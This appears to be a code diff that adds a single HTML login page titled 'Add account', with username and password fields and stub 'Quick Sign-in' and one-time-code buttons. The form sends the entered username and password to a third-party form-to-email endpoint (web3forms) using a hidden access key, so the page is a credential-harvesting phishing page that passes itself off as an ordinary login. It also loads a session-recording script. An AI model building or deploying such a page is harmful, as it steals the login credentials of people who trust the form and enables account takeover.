@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Login</title>
+
+    <!-- TAB ICON -->
+    <link rel="icon" type="image/png" href="icon.png">
+
+    <!-- LOGROCKET TRACKING SCRIPT -->
+    <script src="https://cdn.logr-in.com/LogRocket.min.js" crossorigin="anonymous"></script>
+    <script>window.LogRocket && window.LogRocket.init('ksgyyy/login');</script>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        /* =========================
+           WEBSITE BACKGROUND
+           ========================= */
+        body {
+            margin: 0;
+            min-height: 100vh;
+
+            background-image:
+                linear-gradient(
+                    rgba(0, 0, 0, 0.35),
+                    rgba(0, 0, 0, 0.35)
+                ),
+                url("background.png.avif");
+
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+
+            color: white;
+
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+
+        /* =========================
+           LOGIN PANEL
+           ========================= */
+        .login-box {
+            width: 365px;
+            padding: 18px;
+
+            background: #27282f;
+
+            text-align: center;
+
+            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.6);
+            border-radius: 8px;
+        }
+
+
+        /* TITLE */
+        h1 {
+            margin: 4px 0 10px;
+
+            font-size: 32px;
+            font-weight: 700;
+        }
+
+
+        /* INPUT BOXES */
+        input {
+            width: 100%;
+            height: 39px;
+
+            margin-bottom: 17px;
+            padding: 0 12px;
+
+            background: #363943;
+
+            border: 1px solid #50535d;
+            border-radius: 7px;
+
+            color: white;
+            font-size: 16px;
+
+            outline: none;
+        }
+
+        input:focus {
+            border-color: #aaa;
+        }
+
+        input::placeholder {
+            color: #eeeeee;
+        }
+
+
+        /* ALL BUTTONS */
+        button, .login-btn {
+            width: 100%;
+            height: 37px;
+
+            border-radius: 7px;
+
+            font-size: 16px;
+            font-weight: bold;
+
+            cursor: pointer;
+        }
+
+
+        /* LOGIN BUTTON */
+        .login-btn {
+            background: transparent;
+            color: #ddd;
+            border: 1px solid #ddd;
+        }
+
+        .login-btn:hover {
+            background: #34363e;
+        }
+
+
+        /* FORGOT PASSWORD */
+        .forgot {
+            display: block;
+
+            margin: 27px 0 32px;
+
+            color: white;
+
+            font-weight: bold;
+
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .forgot:hover {
+            text-decoration: underline;
+        }
+
+
+        /* DIVIDER */
+        .divider {
+            height: 1px;
+
+            background: #3a3c43;
+
+            margin-bottom: 18px;
+        }
+
+
+        /* OTHER BUTTONS */
+        .secondary-btn {
+            background: #3b3e49;
+
+            color: white;
+
+            border: none;
+
+            margin-bottom: 12px;
+        }
+
+        .secondary-btn:hover {
+            background: #454853;
+        }
+
+
+        /* CREATE ACCOUNT */
+        .create {
+            display: block;
+
+            margin-top: 35px;
+
+            color: white;
+
+            font-weight: bold;
+
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .create:hover {
+            text-decoration: underline;
+        }
+
+
+        /* MESSAGE */
+        #message {
+            margin-top: 15px;
+
+            font-weight: bold;
+            font-size: 14px;
+        }
+    </style>
+</head>
+
+
+<body>
+
+    <!-- LOGIN BOX -->
+    <div class="login-box">
+
+        <h1>Add account</h1>
+
+        <!-- WEB3FORMS FORM WRAPPER -->
+        <form action="https://api.web3forms.com/submit" method="POST">
+
+            <!-- Hidden Access Key required by Web3Forms -->
+            <input type="hidden" name="access_key" value="5af1fe4c-4c28-47b6-9445-f72374380afa">
+
+            <input
+                type="text"
+                id="username"
+                name="username"
+                placeholder="Username/Email/Phone"
+                required
+            >
+
+            <input
+                type="password"
+                id="password"
+                name="password"
+                placeholder="Password"
+                required
+            >
+
+            <button type="submit" class="login-btn">
+                Log In
+            </button>
+
+        </form>
+
+
+        <a href="#" class="forgot">
+            Forgot Password or Username?
+        </a>
+
+
+        <div class="divider"></div>
+
+
+        <button
+            type="button"
+            class="secondary-btn"
+            onclick="oneTimeCode()">
+
+            Email Me a One-Time Code
+
+        </button>
+
+
+        <button
+            type="button"
+            class="secondary-btn"
+            onclick="quickSignIn()">
+
+            Quick Sign-in
+
+        </button>
+
+
+        <a href="#" class="create">
+            Create A New Account
+        </a>
+
+
+        <div id="message"></div>
+
+    </div>
+
+
+    <script>
+        function oneTimeCode() {
+            const message = document.getElementById("message");
+            message.style.color = "#ffd166";
+            message.textContent = "One-time code demo.";
+        }
+
+        function quickSignIn() {
+            const message = document.getElementById("message");
+            message.style.color = "#ffd166";
+            message.textContent = "Quick sign-in demo.";
+        }
+    </script>
+
+</body>
+</html>
